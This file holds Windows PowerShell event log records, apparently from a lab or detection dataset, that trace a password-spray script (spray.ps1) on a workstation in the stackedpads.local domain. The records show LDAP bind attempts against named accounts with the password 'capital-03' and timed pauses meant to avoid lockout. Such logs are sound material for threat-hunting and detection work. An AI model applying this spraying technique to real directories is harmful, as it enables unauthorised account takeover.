<14>Jul  8 13:49:44 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657288183,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":501,"SourceName":"PowerShell","Version":0,"Task":5,"OpcodeValue":0,"RecordNumber":4833,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Command \"New-Object\" is Stopped. \r\n\r\nDetails: \r\n\tNewCommandState=Stopped\r\n\r\n\tSequenceNumber=671\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=32\r\n\tCommandName=New-Object\r\n\tCommandType=Cmdlet\r\n\tScriptName=G:\\spray.ps1\r\n\tCommandPath=\r\n\tCommandLine=        $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain,$User,$Password)\r\n","Category":"Command Lifecycle","Opcode":"Info","EventReceivedTime":1657288184,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:49:44 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657288183,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":500,"SourceName":"PowerShell","Version":0,"Task":5,"OpcodeValue":0,"RecordNumber":4799,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Command \"New-Object\" is Started. \r\n\r\nDetails: \r\n\tNewCommandState=Started\r\n\r\n\tSequenceNumber=626\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=32\r\n\tCommandName=New-Object\r\n\tCommandType=Cmdlet\r\n\tScriptName=G:\\spray.ps1\r\n\tCommandPath=\r\n\tCommandLine=    $RandNo = New-Object System.Random\r\n","Category":"Command Lifecycle","Opcode":"Info","EventReceivedTime":1657288184,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:49:44 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657288183,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":500,"SourceName":"PowerShell","Version":0,"Task":5,"OpcodeValue":0,"RecordNumber":4838,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Command \"New-Object\" is Started. \r\n\r\nDetails: \r\n\tNewCommandState=Started\r\n\r\n\tSequenceNumber=678\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=32\r\n\tCommandName=New-Object\r\n\tCommandType=Cmdlet\r\n\tScriptName=G:\\spray.ps1\r\n\tCommandPath=\r\n\tCommandLine=        $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain,$User,$Password)\r\n","Category":"Command Lifecycle","Opcode":"Info","EventReceivedTime":1657288184,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:49:44 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657288183,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":501,"SourceName":"PowerShell","Version":0,"Task":5,"OpcodeValue":0,"RecordNumber":4824,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Command \"New-Object\" is Stopped. \r\n\r\nDetails: \r\n\tNewCommandState=Stopped\r\n\r\n\tSequenceNumber=659\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=32\r\n\tCommandName=New-Object\r\n\tCommandType=Cmdlet\r\n\tScriptName=G:\\spray.ps1\r\n\tCommandPath=\r\n\tCommandLine=        $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain,$User,$Password)\r\n","Category":"Command Lifecycle","Opcode":"Info","EventReceivedTime":1657288184,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:49:44 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657288183,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":501,"SourceName":"PowerShell","Version":0,"Task":5,"OpcodeValue":0,"RecordNumber":4806,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Command \"New-Object\" is Stopped. \r\n\r\nDetails: \r\n\tNewCommandState=Stopped\r\n\r\n\tSequenceNumber=635\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=32\r\n\tCommandName=New-Object\r\n\tCommandType=Cmdlet\r\n\tScriptName=G:\\spray.ps1\r\n\tCommandPath=\r\n\tCommandLine=        $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain,$User,$Password)\r\n","Category":"Command Lifecycle","Opcode":"Info","EventReceivedTime":1657288184,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:49:44 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657288183,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":800,"SourceName":"PowerShell","Version":0,"Task":8,"OpcodeValue":0,"RecordNumber":4822,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Pipeline execution details for command line:         $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain,$User,$Password)\r\n. \r\n\r\nContext Information: \r\n\tDetailSequence=1\r\n\tDetailTotal=1\r\n\r\n\tSequenceNumber=656\r\n\r\n\tUserId=STACKEDPADS\\tim.smith\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=32\r\n\tScriptName=G:\\spray.ps1\r\n\tCommandLine=        $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain,$User,$Password)\r\n \r\n\r\nDetails: \r\nCommandInvocation(New-Object): \"New-Object\"\r\nParameterBinding(New-Object): name=\"TypeName\"; value=\"System.DirectoryServices.DirectoryEntry\"\r\nParameterBinding(New-Object): name=\"ArgumentList\"; value=\"LDAP://DC=stackedpads,DC=local, dave.young, capital-03\"\r\n","Category":"Pipeline Execution Details","Opcode":"Info","EventReceivedTime":1657288184,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:49:44 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657288183,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":500,"SourceName":"PowerShell","Version":0,"Task":5,"OpcodeValue":0,"RecordNumber":4842,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Command \"Countdown-Timer\" is Started. \r\n\r\nDetails: \r\n\tNewCommandState=Started\r\n\r\n\tSequenceNumber=683\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=32\r\n\tCommandName=Countdown-Timer\r\n\tCommandType=Function\r\n\tScriptName=G:\\spray.ps1\r\n\tCommandPath=\r\n\tCommandLine=                Countdown-Timer -Seconds (60*$observation_window + $Fudge) -Quiet $Quiet\r\n","Category":"Command Lifecycle","Opcode":"Info","EventReceivedTime":1657288184,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:49:44 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657288183,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":501,"SourceName":"PowerShell","Version":0,"Task":5,"OpcodeValue":0,"RecordNumber":4800,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Command \"New-Object\" is Stopped. \r\n\r\nDetails: \r\n\tNewCommandState=Stopped\r\n\r\n\tSequenceNumber=627\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=32\r\n\tCommandName=New-Object\r\n\tCommandType=Cmdlet\r\n\tScriptName=G:\\spray.ps1\r\n\tCommandPath=\r\n\tCommandLine=    $RandNo = New-Object System.Random\r\n","Category":"Command Lifecycle","Opcode":"Info","EventReceivedTime":1657288184,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:49:44 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657288183,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":500,"SourceName":"PowerShell","Version":0,"Task":5,"OpcodeValue":0,"RecordNumber":4802,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Command \"New-Object\" is Started. \r\n\r\nDetails: \r\n\tNewCommandState=Started\r\n\r\n\tSequenceNumber=630\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=32\r\n\tCommandName=New-Object\r\n\tCommandType=Cmdlet\r\n\tScriptName=G:\\spray.ps1\r\n\tCommandPath=\r\n\tCommandLine=        $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain,$User,$Password)\r\n","Category":"Command Lifecycle","Opcode":"Info","EventReceivedTime":1657288184,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:49:44 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657288183,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":500,"SourceName":"PowerShell","Version":0,"Task":5,"OpcodeValue":0,"RecordNumber":4846,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Command \"Start-Sleep\" is Started. \r\n\r\nDetails: \r\n\tNewCommandState=Started\r\n\r\n\tSequenceNumber=688\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=32\r\n\tCommandName=Start-Sleep\r\n\tCommandType=Cmdlet\r\n\tScriptName=G:\\spray.ps1\r\n\tCommandPath=\r\n\tCommandLine=        Start-Sleep -Seconds $Seconds\r\n","Category":"Command Lifecycle","Opcode":"Info","EventReceivedTime":1657288184,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:49:44 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657288183,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":501,"SourceName":"PowerShell","Version":0,"Task":5,"OpcodeValue":0,"RecordNumber":4839,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Command \"New-Object\" is Stopped. \r\n\r\nDetails: \r\n\tNewCommandState=Stopped\r\n\r\n\tSequenceNumber=679\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=32\r\n\tCommandName=New-Object\r\n\tCommandType=Cmdlet\r\n\tScriptName=G:\\spray.ps1\r\n\tCommandPath=\r\n\tCommandLine=        $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain,$User,$Password)\r\n","Category":"Command Lifecycle","Opcode":"Info","EventReceivedTime":1657288184,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:49:44 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657288183,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":500,"SourceName":"PowerShell","Version":0,"Task":5,"OpcodeValue":0,"RecordNumber":4820,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Command \"New-Object\" is Started. \r\n\r\nDetails: \r\n\tNewCommandState=Started\r\n\r\n\tSequenceNumber=654\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=32\r\n\tCommandName=New-Object\r\n\tCommandType=Cmdlet\r\n\tScriptName=G:\\spray.ps1\r\n\tCommandPath=\r\n\tCommandLine=        $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain,$User,$Password)\r\n","Category":"Command Lifecycle","Opcode":"Info","EventReceivedTime":1657288184,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:49:44 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657288183,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":501,"SourceName":"PowerShell","Version":0,"Task":5,"OpcodeValue":0,"RecordNumber":4841,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Command \"Invoke-SpraySinglePassword\" is Stopped. \r\n\r\nDetails: \r\n\tNewCommandState=Stopped\r\n\r\n\tSequenceNumber=682\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=32\r\n\tCommandName=Invoke-SpraySinglePassword\r\n\tCommandType=Function\r\n\tScriptName=G:\\spray.ps1\r\n\tCommandPath=\r\n\tCommandLine=            Invoke-SpraySinglePassword -Domain $CurrentDomain -UserListArray $UserListArray -Password $Passwords[$i] -OutFile $OutFile -Delay $Delay -Jitter $Jitter -Quiet $Quiet\r\n","Category":"Command Lifecycle","Opcode":"Info","EventReceivedTime":1657288184,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:49:44 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657288183,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":800,"SourceName":"PowerShell","Version":0,"Task":8,"OpcodeValue":0,"RecordNumber":4798,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Pipeline execution details for command line:     Write-Host \"[*] Now trying password $Password against $count users. Current time is $($time.ToShortTimeString())\"\r\n. \r\n\r\nContext Information: \r\n\tDetailSequence=1\r\n\tDetailTotal=1\r\n\r\n\tSequenceNumber=624\r\n\r\n\tUserId=STACKEDPADS\\tim.smith\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=32\r\n\tScriptName=G:\\spray.ps1\r\n\tCommandLine=    Write-Host \"[*] Now trying password $Password against $count users. Current time is $($time.ToShortTimeString())\"\r\n \r\n\r\nDetails: \r\nCommandInvocation(Write-Host): \"Write-Host\"\r\nParameterBinding(Write-Host): name=\"Object\"; value=\"[*] Now trying password capital-03 against 13 users. Current time is 1:49 PM\"\r\n","Category":"Pipeline Execution Details","Opcode":"Info","EventReceivedTime":1657288184,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:49:44 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657288183,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":500,"SourceName":"PowerShell","Version":0,"Task":5,"OpcodeValue":0,"RecordNumber":4843,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Command \"Write-Host\" is Started. \r\n\r\nDetails: \r\n\tNewCommandState=Started\r\n\r\n\tSequenceNumber=684\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=32\r\n\tCommandName=Write-Host\r\n\tCommandType=Cmdlet\r\n\tScriptName=G:\\spray.ps1\r\n\tCommandPath=\r\n\tCommandLine=        Write-Host \"$Message Waiting for $($Seconds/60) minutes. $($Seconds - $Count)\"\r\n","Category":"Command Lifecycle","Opcode":"Info","EventReceivedTime":1657288184,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:49:44 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657288183,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":500,"SourceName":"PowerShell","Version":0,"Task":5,"OpcodeValue":0,"RecordNumber":4829,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Command \"New-Object\" is Started. \r\n\r\nDetails: \r\n\tNewCommandState=Started\r\n\r\n\tSequenceNumber=666\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=32\r\n\tCommandName=New-Object\r\n\tCommandType=Cmdlet\r\n\tScriptName=G:\\spray.ps1\r\n\tCommandPath=\r\n\tCommandLine=        $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain,$User,$Password)\r\n","Category":"Command Lifecycle","Opcode":"Info","EventReceivedTime":1657288184,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:49:44 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657288183,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":501,"SourceName":"PowerShell","Version":0,"Task":5,"OpcodeValue":0,"RecordNumber":4830,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Command \"New-Object\" is Stopped. \r\n\r\nDetails: \r\n\tNewCommandState=Stopped\r\n\r\n\tSequenceNumber=667\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=32\r\n\tCommandName=New-Object\r\n\tCommandType=Cmdlet\r\n\tScriptName=G:\\spray.ps1\r\n\tCommandPath=\r\n\tCommandLine=        $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain,$User,$Password)\r\n","Category":"Command Lifecycle","Opcode":"Info","EventReceivedTime":1657288184,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:49:44 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657288183,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":500,"SourceName":"PowerShell","Version":0,"Task":5,"OpcodeValue":0,"RecordNumber":4835,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Command \"New-Object\" is Started. \r\n\r\nDetails: \r\n\tNewCommandState=Started\r\n\r\n\tSequenceNumber=674\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=32\r\n\tCommandName=New-Object\r\n\tCommandType=Cmdlet\r\n\tScriptName=G:\\spray.ps1\r\n\tCommandPath=\r\n\tCommandLine=        $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain,$User,$Password)\r\n","Category":"Command Lifecycle","Opcode":"Info","EventReceivedTime":1657288184,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:49:44 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657288183,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":800,"SourceName":"PowerShell","Version":0,"Task":8,"OpcodeValue":0,"RecordNumber":4828,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Pipeline execution details for command line:         $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain,$User,$Password)\r\n. \r\n\r\nContext Information: \r\n\tDetailSequence=1\r\n\tDetailTotal=1\r\n\r\n\tSequenceNumber=664\r\n\r\n\tUserId=STACKEDPADS\\tim.smith\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=32\r\n\tScriptName=G:\\spray.ps1\r\n\tCommandLine=        $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain,$User,$Password)\r\n \r\n\r\nDetails: \r\nCommandInvocation(New-Object): \"New-Object\"\r\nParameterBinding(New-Object): name=\"TypeName\"; value=\"System.DirectoryServices.DirectoryEntry\"\r\nParameterBinding(New-Object): name=\"ArgumentList\"; value=\"LDAP://DC=stackedpads,DC=local, jeff.armstrong, capital-03\"\r\n","Category":"Pipeline Execution Details","Opcode":"Info","EventReceivedTime":1657288184,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
